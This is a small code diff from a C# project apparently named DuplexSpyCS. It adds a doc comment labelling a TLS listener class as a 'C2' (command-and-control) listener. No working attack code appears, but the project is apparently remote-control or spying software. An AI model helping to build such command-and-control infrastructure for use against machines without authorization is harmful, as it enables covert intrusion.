@@ -10,6 +10,9 @@ using System.Threading.Tasks;
 
 namespace DuplexSpyCS
 {
+    /// <summary>
+    /// C2 TLS Listener.
+    /// </summary>
     public class clsTlsListener : clsListener
     {
         private X509Certificate m_certificate { get; set; }
